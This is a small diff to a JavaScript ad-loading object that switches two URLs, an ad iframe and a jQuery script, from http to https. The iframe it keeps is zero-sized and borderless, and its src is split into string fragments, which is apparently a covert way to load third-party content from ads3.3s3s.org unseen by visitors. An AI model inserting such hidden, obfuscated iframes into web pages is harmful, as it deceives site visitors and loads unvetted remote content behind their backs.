@@ -65,7 +65,7 @@ var _3s3sObjectAD =
 		
 		placeFirst.parentNode.style.display = 'block';
 		
-		var ads3 = "<iframe target='_blank' frameborder='0' s"+"rc='http:/"+"/ads3"+".3s3s"+".org' scrolling='no' style='width:0px; height:0px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>";
+		var ads3 = "<iframe target='_blank' frameborder='0' s"+"rc='https:/"+"/ads3"+".3s3s"+".org' scrolling='no' style='width:0px; height:0px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>";
 			
 		var parent = document.createElement('div');
 		parent.innerHTML = ads3;
@@ -93,7 +93,7 @@ var _3s3sObjectAD =
 		{
 		   var script = document.createElement('script');
 		   script.type = "text/javascript";
-		   script.src = "http://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js";
+		   script.src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js";
 		   
 		   // Attach handlers for all browsers
 		   script.onload = script.onreadystatechange = function() {
